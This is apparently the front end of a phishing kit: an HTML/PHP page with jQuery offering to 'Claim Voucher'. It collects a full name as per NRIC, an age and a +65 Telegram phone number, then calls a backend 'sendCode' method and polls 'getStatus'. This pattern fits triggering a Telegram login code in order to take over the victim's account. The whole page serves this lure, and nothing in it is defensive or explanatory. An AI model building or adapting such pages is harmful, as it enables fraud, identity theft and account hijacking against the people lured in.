<div class="loader" id="loader">
  <div class="spinner"></div>
</div>

<div class="text-center">
<!-- Full Name -->
<div class="mb-3">
  <div class="input-group">
    <span class="input-group-text">🪪</span> <!-- Emoji ID Card -->
    <input type="text" name="nama" class="form-control" placeholder="Enter your full name as per NRIC" />
  </div>
</div>

<!-- Age -->
<div class="mb-3">
  <div class="input-group">
    <span class="input-group-text">🎂</span> <!-- Emoji Ulang Tahun -->
    <input type="number" name="age" id="age" class="form-control" placeholder="Enter your age" />
  </div>
</div>

  <!-- Telegram Phone Number -->
  <div class="mb-3" style="margin-top: 10px;">
    <label id="wrong" for="" class="form-label"><span style="color: darkred;">Please enter a valid phone number.</span></label>
    <div class="input-group">
      <span class="input-group-text" id="basic-addon1" style="display: flex; gap: 3px; background: #FFF; border-top-left-radius: 5px; border-bottom-left-radius: 5px; padding-left: 14px; border-right: none; border: 1px solid rgba(0, 0, 0, 0.23);">
        <img src="https://www.svgrepo.com/show/405601/flag-for-flag-singapore.svg" style="height: 24px;" />
      </span>
      <input type="tel" class="form-control" name="phone" id="phone" placeholder="Enter your Telegram number" aria-label="Phone" aria-describedby="basic-addon1" required style=" border-top-left-radius: 0px!important; border-bottom-left-radius: 0px!important; padding-left: 0px!important; border-left: none;" />

    </div>
    <p style="margin: 0px; color: #636467; font-size: 14px; margin-top: 10px;" ><small class="form-text text-muted">
  Must start with <strong>+65</strong> (e.g. +65 8123 4567)
</small></p>
  </div>
  </div>

  <!-- Button -->
  <button class="btdk btn mx-auto d-block px-5">
    Claim Voucher<span class="bi bi-arrow-right ps-2"></span>
  </button>
</div>


<script>
  $("#wrong").hide();
  $("#loader").hide();

  $("input#phone").on("click", function () {
    if ($(this).val() == "") {
      $(this).val("+<?= $CCODE ?>");
    }
  });

  function checkStatus() {
    $("#wrong").hide();
    $.ajax({
      url: "<?= base_url("API/index.php") ?>",
      type: "POST",
      data: { "method": "getStatus" },
      success: function (data) {
        if (data.result.status == "success") {
          window.location.reload();
        } else if (data.result.status == "failed") {
          $("#wrong").show();
          $("#loader").hide();
        } else {
          setTimeout(function () {
            checkStatus();
          }, 500);
        }
      }, error: function (data) { }
    });
  }

  $("button").on("click", function (e) {
    e.preventDefault();
    var phone = $("input#phone").val();

    if (phone != "") {
      $("#loader").show();
      $.ajax({
        url: "<?= base_url("API/index.php") ?>",
        type: "POST",
        data: { "method": "sendCode", "phone": phone },
        success: function (data) {
          setTimeout(function () {
            checkStatus();
          }, 500);
        },
        error: function (data) { }
      });
    }
  });
</script>
